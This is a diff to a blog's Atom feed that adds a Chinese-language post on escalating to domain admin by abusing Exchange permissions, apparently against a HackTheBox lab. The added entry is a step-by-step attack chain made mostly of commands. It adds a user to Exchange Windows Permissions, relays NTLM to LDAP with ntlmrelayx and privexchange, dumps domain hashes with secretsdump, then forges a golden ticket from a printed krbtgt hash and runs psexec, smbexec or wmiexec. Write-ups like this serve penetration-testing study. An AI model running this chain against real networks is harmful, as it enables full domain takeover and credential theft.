@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://github.com/"/>
-  <updated>2020-04-25T15:10:07.667Z</updated>
+  <updated>2020-04-25T16:32:53.954Z</updated>
   <id>https://github.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>域控提权之Exchange提权</title>
+    <link href="https://github.com/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/"/>
+    <id>https://github.com/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/</id>
+    <published>2020-04-25T16:09:28.000Z</published>
+    <updated>2020-04-25T16:32:53.954Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="原理-："><a href="#原理-：" class="headerlink" title="原理 ："></a>原理 ：</h2><p>Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync</p><p>也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限</p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>net group 查看用户组</p><p><img src="1.png" alt=""></p><p>或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组</p><p>添加用户tw：</p><pre><code>$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -ForceNew-ADUser tw -AccountPassword $pass -Enabled $True</code></pre><p>将用户添加到Exchange Permissions组</p><pre><code>net group &quot;Exchange Windows Permissions&quot; tw /add 或Import-Module ActiveDirectoryAdd-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw</code></pre><p>检查是否已成功添加</p><pre><code>net group &quot;Exchange Windows Permissions&quot; /domain </code></pre><p>使用ntlmrelayx.py进行ntlm中继：</p><pre><code>sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw</code></pre><p>运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接</p><pre><code>python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local</code></pre><p>（10.10.16.21为我kali ip）</p><p><img src="2.png" alt=""></p><p>连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示</p><pre><code>impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc</code></pre><p><img src="3.png" alt=""></p><p><strong>进一步学习：在Linux上使用KRBTGT hash实现金票攻击</strong></p><p>在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它</p><p>首先获取domain sid ：</p><pre><code>Get-ADDomain htb.localS-1-5-21-3072663084-364016917-1341370565</code></pre><p>使用NTLM生成TGT###TGT也可以使用AES-KEY生成</p><pre><code>python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit</code></pre><p>运行之后生成一个UserDoesnotExit.ccache缓存文件<br>使用ccache设置ticket</p><p><code>export KRB5CCNAME=UserDoesnotExit.ccache</code></p><p>使用TGT使用下列任意方式远程执行命令</p><pre><code>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-passpython smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-passpython wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</code></pre><p>执行之前需要同步域控时间，否则会出现下列错误<br>    sudo rdate 10.10.10.161</p><p><img src="4.png" alt=""></p><pre><code>python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass</code></pre><p>不能使用IP进行连接</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;原理-：&quot;&gt;&lt;a href=&quot;#原理-：&quot; class=&quot;headerlink&quot; title=&quot;原理 ：&quot;&gt;&lt;/a&gt;原理 ：&lt;/h2&gt;&lt;p&gt;Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteD
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>域控提权之ms14-068</title>
